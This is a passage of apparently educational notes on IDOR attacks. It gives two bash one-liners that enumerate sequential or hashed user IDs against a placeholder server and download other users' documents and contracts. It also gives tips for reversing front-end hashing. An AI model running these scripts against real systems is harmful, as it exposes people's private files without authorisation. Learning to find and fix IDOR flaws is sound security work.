**Simple bash script to automate this :** 
```python
#!/bin/bash url="http://SERVER_IP:PORT" for i in {1..10}; do for link in $(curl -s "$url/documents.php?uid=$i" | grep -oP "\/documents.*?.pdf"); do wget -q $url/$link done done
```

#!/bin/bash

#### Hashed or encoded objects
- In the above case the uid parameter was in clear text and we were able to enumerate it to get the data of other users in the web server.
- In certain cases, the parameters may be encoded/hashed. if it's encoded we can try but if its hashed we wont be able to unhash it.
- We can try [crackstation](https://crackstation.net/) but result is not guaranteed.

> One thing we can try is to check the front-end code and see if the hashing is being performed in the front-end and whether we can find the unhashed parameter value, if we can we can generate the word-list, hash it and then perform the IDOR attacks.

**Bash script to achieve the same:** 
```python
#!/bin/bash 
for i in {1..10}; do for hash in $(echo -n $i | base64 -w 0 | md5sum | tr -d ' -'); do curl -sOJ -X POST -d "contract=$hash" http://SERVER_IP:PORT/download.php done done
```
